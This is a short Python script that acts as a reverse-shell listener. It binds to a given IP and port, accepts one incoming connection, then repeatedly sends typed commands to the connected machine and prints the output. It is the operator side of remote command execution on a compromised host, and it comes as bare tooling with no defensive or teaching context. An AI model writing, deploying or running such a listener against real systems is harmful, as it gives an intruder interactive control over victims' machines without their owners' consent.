#!/usr/bin/python

import socket
from termcolor import colored
import sys

def shell():
    while True:
        command = input("Shell@{}~".format(ip[0]))
        target.send(command.encode("utf-8"))
        message = target.recv(1024)
        print(message.decode("utf-8"))


def server ():
    global s
    global ip
    global target
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((sys.argv[1],int(sys.argv[2])))
    s.listen(5)
    print(colored("[+] Listening For Incoming Connections", "green"))
    target, ip = s.accept()
    print(colored("[+] Connection Established From : {}".format(ip), "green"))
    

server()
shell()
s.close()